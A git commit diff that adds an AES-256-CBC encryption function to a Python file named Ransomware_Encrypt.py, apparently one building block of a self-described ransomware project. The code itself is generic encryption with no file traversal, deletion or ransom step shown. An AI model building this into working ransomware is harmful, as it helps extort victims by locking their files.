8f5c953dcc320067a1b5f024b0714c83e07ed4ae
Wambita <wambitafana@gmail.com>
2026-03-02 14:01:40 +0300

    Feat: create a function to encrypt the data using AES-256-cbc

--- Ransomware_Encrypt.py
+++ Ransomware_Encrypt.py
@@ -22,3 +22,28 @@ def derive_key(password: str, salt: bytes)-> bytes:
     )
     key = kdf.derive(password.encode())
     return key
+
+def encrypt_data(data: bytes, password: str) -> bytes:
+    """Encrypt the data using AES-256-CBC."""
+    # Generate a random salt
+    salt = os.urandom(16)
+    
+    # Derive a key from the password and salt
+    key = derive_key(password, salt)
+    
+    # Generate a random initialization vector (IV)
+    iv = os.urandom(16)
+    
+    # Create a Cipher object
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+    
+    # Pad the data to be a multiple of the block size
+    padder = padding.PKCS7(algorithms.AES.block_size).padder()
+    padded_data = padder.update(data) + padder.finalize()
+    
+    # Encrypt the data
+    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
+    
+    # Return the salt, IV, and ciphertext concatenated together
+    return salt + iv + ciphertext
